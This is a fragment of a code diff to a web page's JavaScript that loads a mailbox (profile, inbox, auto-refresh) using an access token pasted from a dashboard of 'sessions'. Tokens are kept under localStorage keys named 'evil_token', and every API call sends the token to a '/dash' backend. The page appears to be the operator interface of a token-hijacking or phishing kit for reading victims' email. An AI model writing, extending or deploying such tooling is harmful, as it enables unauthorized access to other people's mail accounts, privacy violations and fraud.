+                            select a session, and copy the token.
+                        </p>
+                    </div>
+                `;
                 return;
             }
-            list.innerHTML = '';
-            result.emails.forEach(email => {
-                const div = document.createElement('div');
-                div.className = 'email-item';
-                div.innerHTML = `
-                    <span class="status">${email.isRead ? '📩' : '📨'}</span>
-                    <span class="from">${email.sender?.emailAddress?.address || 'Unknown'}</span>
-                    <span class="subject">${email.subject || '(no subject)'}</span>
-                    <span class="date">${new Date(email.receivedDateTime).toLocaleString()}</span>
-                `;
-                div.onclick = () => viewEmail(email.id);
-                list.appendChild(div);
-            });
+            
+            try {
+                await loadProfile();
+                await loadFolder('inbox');
+                startAutoRefresh();
+                document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
+            } catch (e) {
+                document.getElementById('statusText').textContent = '❌ Error: ' + e.message;
+            }
         }
-    }
 
-    // ---------- Refresh ----------
-    function refreshMailbox() {
-        loadEmails(currentFolder);
-    }
+        // Override apiCall to use the token from storage
+        const originalApiCall = apiCall;
+        apiCall = async function(endpoint, method = 'POST', body = null) {
+            if (!accessToken) {
+                if (!getTokenFromStorage()) {
+                    alert('No access token found. Please go to the dashboard and select a session.');
+                    return null;
+                }
+            }
+            const options = {
+                method: method,
+                headers: { 'Content-Type': 'application/json' }
+            };
+            const requestBody = { accessToken, ...(body || {}) };
+            options.body = JSON.stringify(requestBody);
+            
+            const res = await fetch(`/dash${endpoint}`, options);
+            const data = await res.json();
+            if (data.error) {
+                if (data.error.includes('expired') || data.error.includes('invalid') || data.error.includes('401')) {
+                    document.getElementById('tokenStatus').textContent = '🔑 Token: Expired';
+                    alert('Token expired. Please refresh from the dashboard.');
+                    accessToken = null;
+                    localStorage.removeItem('evil_token');
+                    localStorage.removeItem('evil_token_direct');
+                }
+                throw new Error(data.error);
+            }
+            document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
+            return data;
+        };
 
-    // ---------- INIT ----------
-    // Check for token on load
-    const stored = localStorage.getItem('evil_token');
-    if (stored) {
-        try {
-            const data = JSON.parse(stored);
-            currentAccessToken = data.access_token;
-        } catch (e) {}
-    }
-
-    if (currentAccessToken) {
-        loadFolders();
-        loadEmails('inbox');
-    } else {
-        document.getElementById('emailList').innerHTML = `
-            <div class="loading">
-                🔑 No access token found.<br>
-                <button class="btn btn-primary" onclick="getAccessToken();loadEmails('inbox')" style="margin-top:12px;">
-                    Enter Token
-                </button>
-            </div>
-        `;
-    }
-</script>
+        init();
+    </script>
 </body>
 </html>
